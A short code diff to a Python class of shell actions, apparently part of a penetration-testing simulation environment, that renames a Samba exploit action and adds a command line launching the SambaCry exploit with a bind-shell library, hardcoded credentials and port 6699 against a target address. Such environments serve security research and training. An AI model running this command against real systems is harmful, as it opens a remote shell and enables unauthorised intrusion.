@@ -60,7 +60,7 @@ class ShellActions:
                       ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)
 
     @staticmethod
-    def SAMBA_EXPLOIT(index: int) -> Action:
+    def SAMBACRY_EXPLOIT(index: int) -> Action:
         """
         Launches the sambacry exploit
 
@@ -69,6 +69,7 @@ class ShellActions:
         """
         id = ActionId.SAMBACRY_EXPLOIT
         cmd = ["sudo service ssh start",
+               "sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}",
                "/samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
                ]
         return Action(id=id, name="Sambacry Explolit", cmd=cmd,
